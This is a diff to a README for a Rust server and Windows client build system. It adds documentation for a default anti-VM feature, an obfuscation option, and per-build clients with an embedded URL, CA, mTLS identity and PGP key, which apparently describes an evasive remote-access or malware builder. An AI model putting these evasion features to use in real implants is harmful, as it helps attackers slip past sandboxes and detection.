@@ -44,7 +44,8 @@ To build the release server and Windows client in one step:
 ./build.sh
 ```
 
-Use `./build.sh --debug` for native debug builds. The script only compiles the
+Use `./build.sh --debug` for native debug builds. Add `--no-antivm` to disable the default
+anti-VM feature or `--obfs` to enable the optional obfuscation subcommand. The script only compiles the
 crates and does not modify the artifacts under `data/`.
 
 ## Client (Windows)
@@ -61,7 +62,7 @@ produced by the orchestrator (see below and [run.md](run.md)).
 ## Building the functional client (via the orchestrator)
 
 The `new-build` subcommand embeds, at compile time, the build-specific data (build id,
-URL, CA, mTLS identity) and invokes `cargo` to produce the `.exe`:
+URL, CA, mTLS identity, and PGP public key) and invokes `cargo` to produce the `.exe`:
 
 ```bash
 export PATH="$HOME/.cargo/bin:$PATH"   # ensure the cargo with the Windows target is on PATH
@@ -71,6 +72,9 @@ SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server \
   --target x86_64-pc-windows-gnu
 # output: data/clients/<build-id>/client.exe
 ```
+
+Useful build options are `--debug`, `--no-antivm`, and `--obfs`. A debug client writes its
+runtime log to `Desktop/RustBuilder-debug/client.log` on Windows.
 
 ## Full workspace
 
